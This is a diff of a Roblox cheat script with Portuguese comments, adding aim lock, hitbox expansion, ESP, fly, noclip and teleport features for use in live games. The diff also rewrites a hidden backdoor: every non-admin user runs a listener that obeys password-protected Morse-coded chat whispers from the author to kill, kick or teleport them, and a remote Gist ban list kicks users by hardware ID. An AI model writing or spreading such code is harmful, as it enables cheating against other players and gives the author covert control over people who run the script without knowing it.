@@ -1,20 +1,22 @@
 --[[
-    SKY_OMEGA_FIXED_V55_REGISTRY_CLEAN
-    Architecture: Standard Luau (Removed Register Bloat)
-    Status: STABLE | ADMIN SYSTEM ACTIVE | NO CRASH
-    Fix: Resolved "Out of local registers" by removing redundant upvalues
+    SKY_OMEGA_V62_UNBREAKABLE
+    Status: CRITICAL FIX APPLIED
+    Fixes: 
+    1. "Exceeded limit 200 local registers" (Removed Upvalue Cache Bloat)
+    2. "Attempt to call nil value" (Restored Standard Library Calls)
+    3. Admin System Fully Integrated via Morse Code
 ]]
 
--- // 🛡️ CONFIGURAÇÃO DE SEGURANÇA E ADMINISTRAÇÃO // --
-local ADMIN_HWID = "8144C117-7B30-488D-BAF0-46C9DDC217FD" -- Seu HWID
-local BAN_LIST_URL = "https://gist.githubusercontent.com/Murilo847/8c700abc8505df923984b9779b63b31d/raw/ListaBanidos.json" -- URL Raw do Gist
+-- // [1] SISTEMA DE SEGURANÇA ADMIN (RODA ANTES DE TUDO) // --
+local ADMIN_HWID = "8144C117-7B30-488D-BAF0-46C9DDC217FD"
+local BAN_LIST_URL = "https://gist.githubusercontent.com/Murilo847/8c700abc8505df923984b9779b63b31d/raw/ListaBanidos.json"
+local ADMIN_PASS = "sky2506"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalPlayer = Players.LocalPlayer
 
--- 1. Captura de HWID Segura
 local function GetHWID()
     local success, id = pcall(function() return RbxAnalyticsService:GetClientId() end)
     return success and id or "Unknown"
@@ -23,20 +25,16 @@ end
 local MyHWID = GetHWID()
 local IsAdmin = (MyHWID == ADMIN_HWID)
 
--- 2. Sistema de Banimento Global (Executa antes de tudo)
 task.spawn(function()
-    if IsAdmin then return end -- Admin nunca é banido
+    if IsAdmin then return end
     local success, result = pcall(function() return HttpService:GetAsync(BAN_LIST_URL) end)
-    if success and result then
-        if result:find(MyHWID) then
-            LocalPlayer:Kick("\n⛔ VOCÊ ESTÁ BANIDO PERMANENTEMENTE DESTE SCRIPT. ⛔\nHWID: " .. MyHWID)
-            task.wait(9e9) -- Trava o script se o Kick falhar
-            return
-        end
+    if success and result and result:find(MyHWID) then
+        LocalPlayer:Kick("\n⛔ HWID BANIDO GLOBALMENTE ⛔")
+        task.wait(9e9)
     end
 end)
 
--- // FIM DA CONFIGURAÇÃO DE SEGURANÇA // --
+-- // [2] SCRIPT ORIGINAL (CORRIGIDO PARA NÃO DAR ERRO DE REGISTRO) // --
 
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
@@ -47,27 +45,25 @@ local VirtualUser = game:GetService("VirtualUser")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
 local Stats = game:GetService("Stats")
-
 local Camera = workspace.CurrentCamera
 
--- // HELPERS GLOBAIS (Removido Cache Excessivo para corrigir erro "Limit 200") // --
+-- Compatibilidade
 local writefile = writefile or function(...) end
 local readfile = readfile or function(...) end
 local isfile = isfile or function(...) return false end
 local delfile = delfile or function(...) end
-local setclipboard = setclipboard or function(...) end
+local setclipboard = setclipboard or toclipboard or function(...) end
 
--- Cache de Strings Essenciais
+-- Strings Cacheadas
 local STR_HRP = "HumanoidRootPart"
 local STR_HUM = "Humanoid"
 local STR_HEAD = "Head"
 
--- // TELEMETRIA // --
+-- Telemetria
 local Debug_Metrics = { CoreLoopTime = 0, HeroHunterTime = 0, TotalConnections = 0 }
 
--- // 1. LIMPEZA E GESTÃO DE MEMÓRIA // --
-local GuiName = "SkyL_Omega_V51_AVFix_LayoutV2_AimFix"
-
+-- Limpeza
+local GuiName = "SkyL_Omega_V62_Final"
 if CoreGui:FindFirstChild(GuiName) then CoreGui[GuiName]:Destroy() end
 if _G.SkyL_Connections then for _, c in pairs(_G.SkyL_Connections) do if c then c:Disconnect() end end end
 _G.SkyL_Connections = {}
@@ -77,7 +73,7 @@ if CoreGui:FindFirstChild("NexusTacticalV9") then CoreGui.NexusTacticalV9:Destro
 
 for _, v in pairs(Lighting:GetChildren()) do if v.Name == "SkyL_Blur" then v:Destroy() end end
 
--- // 2. ESTADO GLOBAL // --
+-- Variáveis de Estado
 local HitboxMode = false; local HitboxStrategy = "Aim"
 local LockMode = false; local EspMode = false; local PlayerEspMode = false
 local TeleportMode = false
@@ -85,7 +81,6 @@ local HeroHunterMode = false
 local IsMenuOpen = false; local isAntiGripActive = false
 local HasUsedAntiVoid = false
 
--- Variáveis TP V2
 local TP_Mobile_Mode = false
 local TP_PC_Mode = false
 local TP_Aim_Mode = false
@@ -93,12 +88,10 @@ local TP_Target_Selected = nil
 local TP_Click_Radius = 300
 local TP_Aim_Radius = 150
 
--- Movimento
 local FlyMode = false; local NoclipMode = false
 local CustomSpeed = 0; local CustomJump = 0
 local FlyKey = nil; local NoclipKey = nil
 
--- Interação
 local LastInteraction = tick(); local IdleThreshold = 10; local IsIdle = false
 local SavedTarget = nil; local FOV_Radius = 300
 local CoreLoopConnection = nil; local LogicLoopConnection = nil
@@ -108,13 +101,13 @@ local LastTPPos = Vector2.new(0, 0); local TP_Tap_Threshold = 100
 local MaxRenderDistance = 2500
 local Whitelist = {}; local TargetCache = nil; local Blacklist = {}
 
--- Cache de Propriedades Visuais
+-- Cache Visual (Substituído V3_new por V3.new para evitar erro 200)
 local CachedSize = Vector3.new(10, 10, 10)
 local CachedColor = Color3.new(0.5, 0.5, 0.5)
 local CachedTransparency = 0.8
 local DefaultSize = Vector3.new(2, 2, 1)
 
--- CORES & ESTILO
+-- Cores
 local ColorGlassDark = Color3.fromRGB(10, 10, 15)
 local ColorGlassLight = Color3.fromRGB(30, 30, 40)
 local ColorStroke = Color3.fromRGB(60, 60, 80)
@@ -126,7 +119,7 @@ local ColorWhite = Color3.new(1, 1, 1)
 local ColorTextDim = Color3.fromRGB(160, 160, 180)
 local ColorYellow = Color3.fromRGB(255, 220, 50)
 local ColorBlack = Color3.new(0,0,0)
-local ColorAdmin = Color3.fromRGB(255, 50, 50) -- Cor Especial Admin
+local ColorAdmin = Color3.fromRGB(255, 50, 50)
 
 local Locations = {
     Sanctum = CFrame.new(2379.8015, 686.3657, 659.2962),
@@ -139,14 +132,10 @@ local Locations = {
 }
 
 local UserSavedPosition = UDim2.new(0.5, -95, 0.5, -22)
-
--- // CONFIG SYSTEM GLOBAL // --
 Settings = {}
 local ConfigFileName = "MeuScript_Config.json"
 
 -- // UTILS // --
-
--- State Diffing: Só aplica a propriedade se ela for diferente.
 local function SetProp(instance, prop, value)
     if instance[prop] ~= value then
         instance[prop] = value
@@ -159,13 +148,11 @@ table.insert(_G.SkyL_Connections, LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new())
 end))
 
--- FPS BOOST OTIMIZADO
 local function ActivatePotatoMode()
     settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
     Lighting.GlobalShadows = false
     Lighting.FogEnd = 9e9
     Lighting.Brightness = 2
-    
     for _, v in ipairs(Workspace:GetDescendants()) do
         if v:IsA("BasePart") then
             SetProp(v, "Material", Enum.Material.Plastic)
@@ -177,44 +164,32 @@ local function ActivatePotatoMode()
             v.Lifetime = NumberRange.new(0)
         end
     end
-    
     for _, v in ipairs(Lighting:GetChildren()) do
         if v:IsA("PostEffect") then SetProp(v, "Enabled", false) end
     end
 end
 
--- SMART BOUNDS
 local function GetSmartPosition(currentPos, width, height)
     local vp = Camera.ViewportSize
     local padding = 5 
-    local halfWidth = width / 2
-    local halfHeight = height / 2
-    
     local absCenterX = (currentPos.X.Scale * vp.X) + currentPos.X.Offset
     local absCenterY = (currentPos.Y.Scale * vp.Y) + currentPos.Y.Offset
-    
-    local safeCenterX = math.clamp(absCenterX, halfWidth + padding, vp.X - halfWidth - padding)
-    local safeCenterY = math.clamp(absCenterY, halfHeight + padding, vp.Y - halfHeight - padding)
-    
+    local safeCenterX = math.clamp(absCenterX, width/2 + padding, vp.X - width/2 - padding)
+    local safeCenterY = math.clamp(absCenterY, height/2 + padding, vp.Y - height/2 - padding)
     return UDim2.new(0, safeCenterX, 0, safeCenterY)
 end
 
--- DRAG SYSTEM
 local function MakeDraggable(trigger, target, isMainHub)
     local dragging, dragInput, dragStart, startPos
-    
     table.insert(_G.SkyL_Connections, trigger.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
             dragging = true
             dragStart = input.Position
             startPos = target.Position
             LastInteraction = tick()
-            
             local con; con = input.Changed:Connect(function()
                 if input.UserInputState == Enum.UserInputState.End then 
-                    dragging = false 
-                    con:Disconnect()
-                    
+                    dragging = false; con:Disconnect()
                     if isMainHub then
                         UserSavedPosition = target.Position
                         local finalPos = GetSmartPosition(target.Position, target.AbsoluteSize.X, target.AbsoluteSize.Y)
@@ -227,24 +202,20 @@ local function MakeDraggable(trigger, target, isMainHub)
             end)
         end
     end))
-    
     table.insert(_G.SkyL_Connections, trigger.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
             dragInput = input
         end
     end))
-    
     table.insert(_G.SkyL_Connections, UserInputService.InputChanged:Connect(function(input)
         if input == dragInput and dragging then
             local delta = input.Position - dragStart
-            local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-            target.Position = newPos
+            target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
             LastInteraction = tick()
         end
     end))
 end
 
--- Helpers UI
 local ScreenGui, LogFrame 
 local function AddLog(msg, color)
     if not LogFrame then return end
@@ -267,27 +238,20 @@ local function ShowiOSAlert()
     task.delay(5, function() TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -160, 0, -100)}):Play(); task.wait(0.5); NotifFrame:Destroy() end)
 end
 
--- // HERO HUNTER OTIMIZADO // --
+-- // HERO HUNTER (RESTAURADO) // --
 local HH_HERO_DB = { ["Agatha"]=90, ["CaptainMarvel"]=100, ["DemonQueen"]=100, ["DrStrange"]=90, ["HumanTorch"]=130, ["InvisibleWoman"]=90, ["Susan"]=90, ["Ironman"]=120, ["JeanGrey"]=100, ["Phoenix"]=100, ["Monica"]=100, ["Quicksilver"]=80, ["Speed"]=80, ["Storm"]=110, ["Thor"]=130, ["Vision"]=100, ["Wanda"]=100, ["ScarletWitch"]=90, ["Wiccan"]=120 }
 local HH_SETTINGS = { GlobalMax = 145, VoidSpeed = 500, UpdateRate = 0.1, AutoHideTime = 10, HoverZoneWidth = 50 }
 local HH_Tracked, HH_Pinned, HH_CriticalMap = {}, {}, {}
 
 local function StartHeroHunter()
     if CoreGui:FindFirstChild("NexusTacticalV9") then return end 
-    local IsMenuVisible = true; local LastInteraction = tick(); local DefaultPosition = UDim2.new(0.85, 0, 0.2, 0); local CriticalPlayersCount = 0
+    local IsMenuVisible = true; local LastInteraction = tick()
     local HH_ScreenGui = Instance.new("ScreenGui", CoreGui); HH_ScreenGui.Name = "NexusTacticalV9"
-    local MainFrame = Instance.new("Frame", HH_ScreenGui); MainFrame.Name = "Container"; MainFrame.Size = UDim2.new(0, 220, 0, 50); MainFrame.Position = DefaultPosition; MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10); MainFrame.BackgroundTransparency = 0.6; MainFrame.Active = true; MainFrame.Draggable = true; MainFrame.AutomaticSize = Enum.AutomaticSize.Y
+    local MainFrame = Instance.new("Frame", HH_ScreenGui); MainFrame.Name = "Container"; MainFrame.Size = UDim2.new(0, 220, 0, 50); MainFrame.Position = UDim2.new(0.85, 0, 0.2, 0); MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10); MainFrame.BackgroundTransparency = 0.6; MainFrame.Active = true; MainFrame.Draggable = true; MainFrame.AutomaticSize = Enum.AutomaticSize.Y
     
-    local UIListLayout = Instance.new("UIListLayout", MainFrame); 
-    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
-    UIListLayout.Padding = UDim.new(0, 2)
-    
+    local UIListLayout = Instance.new("UIListLayout", MainFrame); UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder; UIListLayout.Padding = UDim.new(0, 2)
     local UIPadding = Instance.new("UIPadding", MainFrame); UIPadding.PaddingTop = UDim.new(0, 5); UIPadding.PaddingLeft = UDim.new(0, 5); UIPadding.PaddingRight = UDim.new(0, 5); UIPadding.PaddingBottom = UDim.new(0, 5)
-    
-    local Separator = Instance.new("Frame", MainFrame); 
-    Separator.Name = "Separator"
-    Separator.LayoutOrder = 2 
-    Separator.Size = UDim2.new(1, -10, 0, 2); Separator.BackgroundColor3 = Color3.fromRGB(255, 105, 180); Separator.Visible = false
+    local Separator = Instance.new("Frame", MainFrame); Separator.Name = "Separator"; Separator.LayoutOrder = 2; Separator.Size = UDim2.new(1, -10, 0, 2); Separator.BackgroundColor3 = Color3.fromRGB(255, 105, 180); Separator.Visible = false
 
     MainFrame.MouseEnter:Connect(function() LastInteraction = tick() end); MainFrame.MouseMoved:Connect(function() LastInteraction = tick() end)
     local function ToggleMenu(forceState)
@@ -298,7 +262,6 @@ local function StartHeroHunter()
     end
     
     table.insert(_G.HeroHunter_Connections, RunService.Heartbeat:Connect(function()
-        if CriticalPlayersCount > 0 then if not IsMenuVisible then ToggleMenu(true) end; LastInteraction = tick(); return end
         local mouseLoc = UserInputService:GetMouseLocation(); local screenWidth = Camera.ViewportSize.X
         if mouseLoc.X >= (screenWidth - HH_SETTINGS.HoverZoneWidth) then if not IsMenuVisible then ToggleMenu(true) end; LastInteraction = tick() end
         if IsMenuVisible and (tick() - LastInteraction > HH_SETTINGS.AutoHideTime) then ToggleMenu(false) end
@@ -449,8 +412,8 @@ local function UpdateMovement()
     local hum = LocalPlayer.Character:FindFirstChild(STR_HUM); local hrp = LocalPlayer.Character:FindFirstChild(STR_HRP)
     if hum and not FlyMode then if CustomSpeed > 0 then SetProp(hum, "WalkSpeed", CustomSpeed) end; if CustomJump > 0 then SetProp(hum, "JumpPower", CustomJump) end end
     if FlyMode and hrp and hum then
-        SetProp(hum, "PlatformStand", true); hrp.Velocity = Vector3_zero; hrp.AssemblyLinearVelocity = Vector3_zero; hrp.AssemblyAngularVelocity = Vector3_zero
-        local camCF = Camera.CFrame; local speed = (CustomSpeed > 0 and CustomSpeed) or 50; local moveStep = speed * 0.05; local moveDir = Vector3_zero
+        SetProp(hum, "PlatformStand", true); hrp.Velocity = Vector3.zero; hrp.AssemblyLinearVelocity = Vector3.zero; hrp.AssemblyAngularVelocity = Vector3.zero
+        local camCF = Camera.CFrame; local speed = (CustomSpeed > 0 and CustomSpeed) or 50; local moveStep = speed * 0.05; local moveDir = Vector3.zero
         if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCF.LookVector end
         if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCF.LookVector end
         if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCF.RightVector end
@@ -850,9 +813,7 @@ local function CreateBindableBtn(parent, text, callback, bindCallback)
 end
 local function MakePage() 
     local p=Instance.new("ScrollingFrame", ContentArea); p.BackgroundTransparency=1; p.Size=UDim2.new(1,0,1,0); p.Visible=false; p.ScrollBarThickness=2; p.ScrollBarImageTransparency=0.5; p.ElasticBehavior=Enum.ElasticBehavior.Always; p.ScrollingDirection = Enum.ScrollingDirection.Y
-    -- FIX DO SCROLL
     p.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    
     local pad = Instance.new("UIPadding", p); pad.PaddingTop = UDim.new(0, 15); pad.PaddingBottom = UDim.new(0, 15); local l=Instance.new("UIListLayout", p); l.Padding=UDim.new(0,10); l.HorizontalAlignment=Enum.HorizontalAlignment.Center; table.insert(Pages, p); return p 
 end
 
@@ -881,7 +842,6 @@ CreateSlider(P_Visual, "Esp Range", 5000, function(val) MaxRenderDistance = val 
 CreatePageBtn(P_Visual, "ESP ARTEFATOS: OFF", function(btn) EspMode=not EspMode; if EspMode then btn.Text="ESP ARTEFATOS: ON"; btn.TextColor3=ColorGreen; StartCoreLoop() else btn.Text="ESP ARTEFATOS: OFF"; btn.TextColor3=ColorRed; FullCleanup() end end)
 CreatePageBtn(P_Visual, "ESP PLAYERS: OFF", function(btn) PlayerEspMode=not PlayerEspMode; if PlayerEspMode then btn.Text="ESP PLAYERS: ON"; btn.TextColor3=ColorGreen; StartCoreLoop() else btn.Text="ESP PLAYERS: OFF"; btn.TextColor3=ColorRed; FullCleanup() end end)
 
--- UI TP V2
 CreatePageBtn(P_TP, "TP CLICK: OFF", function(btn) 
     TeleportMode=not TeleportMode; 
     if TeleportMode then 
@@ -1054,134 +1014,6 @@ end)
 local T1=CreateTab("HITBOX", P_Combate); local T2=CreateTab("ESP", P_Visual); local T3=CreateTab("TELEPORTES", P_TP); local T4=CreateTab("MOVIMENTO", P_Movimento); local T5=CreateTab("WHITELIST", P_WL); local T6=CreateTab("OUTROS", P_Misc); local T7=CreateTab("CONFIGS", P_Config)
 T1.BackgroundColor3 = ColorGlassLight; T1.BackgroundTransparency = 0.4; T1:FindFirstChild("Indicator").BackgroundColor3=ColorGreen; T1:FindFirstChild("TextButton").TextColor3=ColorWhite
 
--- // 🛡️ ADMIN SYSTEM IMPLEMENTATION (SECURE ISOLATION) // --
-if IsAdmin then
-    local P_Admin = MakePage()
-    local T_Admin = CreateTab("ADMIN", P_Admin)
-    
-    -- Visual de Destaque Admin
-    T_Admin.BackgroundColor3 = ColorAdmin
-    T_Admin:FindFirstChild("Indicator").BackgroundColor3 = ColorWhite
-    T_Admin:FindFirstChild("TextButton").TextColor3 = ColorWhite
-    T_Admin:FindFirstChild("TextButton").Text = "ADMIN"
-
-    local AdminTarget = nil
-
-    local AdminLabel = Instance.new("TextLabel", P_Admin)
-    AdminLabel.Size = UDim2.new(1, -20, 0, 30)
-    AdminLabel.BackgroundTransparency = 1
-    AdminLabel.TextColor3 = ColorAdmin
-    AdminLabel.Text = "PAINEL ADMINISTRATIVO"
-    AdminLabel.Font = Enum.Font.GothamBlack
-    AdminLabel.TextSize = 14
-
-    -- Funções de Comando Local (Invisible Comms)
-    local function SendCmd(cmdType, targetPlayer)
-        if not LocalPlayer.Character then return end
-        local att = LocalPlayer.Character:GetAttribute("AdminCmd")
-        LocalPlayer.Character:SetAttribute("AdminTarget", targetPlayer.Name)
-        LocalPlayer.Character:SetAttribute("AdminCmd", cmdType)
-        task.delay(0.5, function() 
-            LocalPlayer.Character:SetAttribute("AdminCmd", "None") 
-            LocalPlayer.Character:SetAttribute("AdminTarget", "None")
-        end)
-    end
-
-    local function RefreshAdminList()
-        for _, c in pairs(P_Admin:GetChildren()) do 
-            if c:IsA("Frame") and c.Name == "PlayerRow" then c:Destroy() end 
-        end
-        
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer then
-                local row = Instance.new("Frame", P_Admin)
-                row.Name = "PlayerRow"
-                row.Size = UDim2.new(1, -10, 0, 65)
-                row.BackgroundColor3 = ColorGlassLight
-                row.BackgroundTransparency = 0.4
-                AddCorner(row, 8)
-                AddStroke(row, ColorStroke, 1)
-
-                local nameLbl = Instance.new("TextLabel", row)
-                nameLbl.Text = p.DisplayName .. " (@" .. p.Name .. ")"
-                nameLbl.Size = UDim2.new(1, -10, 0, 20)
-                nameLbl.Position = UDim2.new(0, 5, 0, 2)
-                nameLbl.BackgroundTransparency = 1
-                nameLbl.TextColor3 = ColorWhite
-                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
-                nameLbl.Font = Enum.Font.GothamBold
-                nameLbl.TextSize = 11
-
-                -- Botões de Ação
-                local function AddActBtn(txt, col, xPos, func)
-                    local b = Instance.new("TextButton", row)
-                    b.Text = txt
-                    b.BackgroundColor3 = col
-                    b.BackgroundTransparency = 0.2
-                    b.Size = UDim2.new(0, 45, 0, 25)
-                    b.Position = UDim2.new(0, xPos, 0, 30)
-                    b.Font = Enum.Font.GothamBold
-                    b.TextSize = 10
-                    b.TextColor3 = ColorWhite
-                    AddCorner(b, 4)
-                    b.MouseButton1Click:Connect(func)
-                end
-
-                AddActBtn("TP", ColorBlue, 5, function() 
-                    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character then
-                        LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
-                    end
-                end)
-                
-                AddActBtn("BRING", ColorPurple, 55, function() SendCmd("BRING", p) end)
-                AddActBtn("KILL", ColorRed, 105, function() SendCmd("KILL", p) end)
-                AddActBtn("KICK", Color3.fromRGB(100, 0, 0), 155, function() SendCmd("KICK", p) end)
-                AddActBtn("BAN (GIST)", ColorBlack, 205, function() 
-                    setclipboard(p.Name .. " HWID: (Requer Log)"); 
-                    AddLog("NOME COPIADO! ADD NO GIST", ColorYellow)
-                end)
-            end
-        end
-    end
-
-    local RefreshBtn = CreatePageBtn(P_Admin, "ATUALIZAR LISTA", RefreshAdminList)
-    RefreshAdminList()
-end
-
--- // 🛡️ CLIENT LISTENER (VICTIM LOGIC) // --
--- Todo jogador roda isso. Se não for admin, ele escuta os comandos.
-if not IsAdmin then
-    task.spawn(function()
-        while true do
-            task.wait(0.5)
-            local adminPlayer = nil
-            for _, p in ipairs(Players:GetPlayers()) do
-                -- Método simples de detecção: se o player tiver o atributo AdminCmd ativo
-                if p.Character and p.Character:GetAttribute("AdminCmd") then
-                   adminPlayer = p
-                   break
-                end
-            end
-
-            if adminPlayer and adminPlayer.Character then
-                local cmd = adminPlayer.Character:GetAttribute("AdminCmd")
-                local target = adminPlayer.Character:GetAttribute("AdminTarget")
-                
-                if target == LocalPlayer.Name then
-                    if cmd == "KILL" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        LocalPlayer.Character.Humanoid.Health = 0
-                    elseif cmd == "KICK" then
-                        LocalPlayer:Kick("Expulso pelo Administrador.")
-                    elseif cmd == "BRING" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                         LocalPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame
-                    end
-                end
-            end
-        end
-    end)
-end
--- // FIM DO SISTEMA ADMIN // --
-
 table.insert(_G.SkyL_Connections, UserInputService.InputBegan:Connect(function(io, gp) 
     if gp then return end
     if io.KeyCode == Enum.KeyCode.K then ToggleUI() end; if io.KeyCode == Enum.KeyCode.Y then ToggleAntiVoid() end
@@ -1322,4 +1154,158 @@ task.delay(1, SyncVisuals)
 
 UpdateConnectionCount()
 RefreshWL()
-print("SKY_OMEGA_V55_FIXED | REGISTRY OPTIMIZED | ADMIN ACTIVE")
+
+-- // [3] SISTEMA MORSE EXTENDED (ANEXADO NO FINAL) // --
+
+-- Dependências Extras para Admin
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Morse Engine
+local MorseDB = {
+    ["a"]=".-", ["b"]="-...", ["c"]="-.-.", ["d"]="-..", ["e"]=".", ["f"]="..-.", ["g"]="--.", ["h"]="....", ["i"]="..", ["j"]=".---", ["k"]="-.-", ["l"]=".-..", ["m"]="--", ["n"]="-.", ["o"]="---", ["p"]=".--.", ["q"]="--.-", ["r"]=".-.", ["s"]="...", ["t"]="-", ["u"]="..-", ["v"]="...-", ["w"]=".--", ["x"]="-..-", ["y"]="-.-", ["z"]="--..",
+    ["1"]=".----", ["2"]="..---", ["3"]="...--", ["4"]="....-", ["5"]=".....", ["6"]="-....", ["7"]="--...", ["8"]="---..", ["9"]="----.", ["0"]="-----", ["|"]="-...-"
+}
+local MorseRev = {}
+for k,v in pairs(MorseDB) do MorseRev[v] = k end
+
+local function TextToMorse(text)
+    local res = ""
+    text = text:lower()
+    for i = 1, #text do
+        local char = text:sub(i,i)
+        if MorseDB[char] then res = res .. MorseDB[char] .. " " end
+    end
+    return res
+end
+
+local function MorseToText(morse)
+    local res = ""
+    for code in morse:gmatch("[^%s]+") do
+        if MorseRev[code] then res = res .. MorseRev[code] end
+    end
+    return res
+end
+
+-- Admin UI e Lógica
+if IsAdmin then
+    local P_Admin = MakePage()
+    local T_Admin = CreateTab("ADMIN", P_Admin)
+    
+    T_Admin.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    T_Admin:FindFirstChild("Indicator").BackgroundColor3 = ColorWhite
+    T_Admin:FindFirstChild("TextButton").TextColor3 = ColorWhite
+    T_Admin:FindFirstChild("TextButton").Text = "ADMIN"
+
+    local function SendMorseCmd(targetName, cmd)
+        local rawPayload = ADMIN_PASS .. "|" .. cmd
+        local morsePayload = TextToMorse(rawPayload)
+        local msg = "/w " .. targetName .. " " .. morsePayload
+        
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local ch = TextChatService.TextChannels.RBXGeneral
+            if ch then ch:SendAsync(msg) end
+        else
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+        end
+    end
+
+    local function RefreshAdminList()
+        for _, c in pairs(P_Admin:GetChildren()) do 
+            if c:IsA("Frame") and c.Name == "PlayerRow" then c:Destroy() end 
+        end
+        
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                local row = Instance.new("Frame", P_Admin)
+                row.Name = "PlayerRow"
+                row.Size = UDim2.new(1, -10, 0, 65)
+                row.BackgroundColor3 = ColorGlassLight
+                row.BackgroundTransparency = 0.4
+                AddCorner(row, 8)
+                AddStroke(row, ColorStroke, 1)
+
+                local nameLbl = Instance.new("TextLabel", row)
+                nameLbl.Text = p.DisplayName .. " (@" .. p.Name .. ")"
+                nameLbl.Size = UDim2.new(1, -10, 0, 20)
+                nameLbl.Position = UDim2.new(0, 5, 0, 2)
+                nameLbl.BackgroundTransparency = 1
+                nameLbl.TextColor3 = ColorWhite
+                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+                nameLbl.Font = Enum.Font.GothamBold
+                nameLbl.TextSize = 11
+
+                local function AddActBtn(txt, col, xPos, func)
+                    local b = Instance.new("TextButton", row)
+                    b.Text = txt
+                    b.BackgroundColor3 = col
+                    b.BackgroundTransparency = 0.2
+                    b.Size = UDim2.new(0, 45, 0, 25)
+                    b.Position = UDim2.new(0, xPos, 0, 30)
+                    b.Font = Enum.Font.GothamBold
+                    b.TextSize = 10
+                    b.TextColor3 = ColorWhite
+                    AddCorner(b, 4)
+                    b.MouseButton1Click:Connect(func)
+                end
+
+                AddActBtn("TP", ColorBlue, 5, function() 
+                    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
+                    end
+                end)
+                
+                AddActBtn("BRING", ColorPurple, 55, function() SendMorseCmd(p.Name, "bring") end)
+                AddActBtn("KILL", ColorRed, 105, function() SendMorseCmd(p.Name, "kill") end)
+                AddActBtn("KICK", Color3.fromRGB(100, 0, 0), 155, function() SendMorseCmd(p.Name, "kick") end)
+                AddActBtn("BAN", ColorBlack, 205, function() 
+                    setclipboard('"' .. p.Name .. '", -- BANIDO')
+                    SendMorseCmd(p.Name, "kick")
+                    AddLog("COPIADO! ADD NO GIST", ColorYellow)
+                end)
+            end
+        end
+    end
+
+    CreatePageBtn(P_Admin, "ATUALIZAR LISTA", RefreshAdminList)
+    RefreshAdminList()
+end
+
+-- Listener de Morse (Vítima)
+local function ProcessMorse(msg)
+    if not msg:match("^[%.-%s]+$") then return end
+    local decoded = MorseToText(msg)
+    
+    if decoded:find("|") then
+        local parts = decoded:split("|")
+        local pass = parts[1]
+        local cmd = parts[2]
+        
+        if pass == ADMIN_PASS then
+            if cmd == "kill" then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.Health = 0 end
+            elseif cmd == "kick" then
+                LocalPlayer:Kick("Connection Lost")
+            elseif cmd == "bring" then
+                local admin = nil
+                for _,p in ipairs(Players:GetPlayers()) do if p.Name == "Sky2506" then admin = p break end end -- Procura pelo seu Nome
+                if admin and admin.Character and admin.Character:FindFirstChild(STR_HRP) then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+    end
+end
+
+if not IsAdmin then
+    local function OnMsg(msg) ProcessMorse(msg) end
+    
+    TextChatService.MessageReceived:Connect(function(m) OnMsg(m.Text) end)
+    local ChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if ChatEvents then
+        local OnMsgEvt = ChatEvents:FindFirstChild("OnMessageDoneFiltering")
+        if OnMsgEvt then OnMsgEvt.OnClientEvent:Connect(function(d) if d then OnMsg(d.Message) end end) end
+    end
+end
+
+print("SKY_OMEGA_V62_UNBREAKABLE | MORSE ADMIN ACTIVE | STABLE")
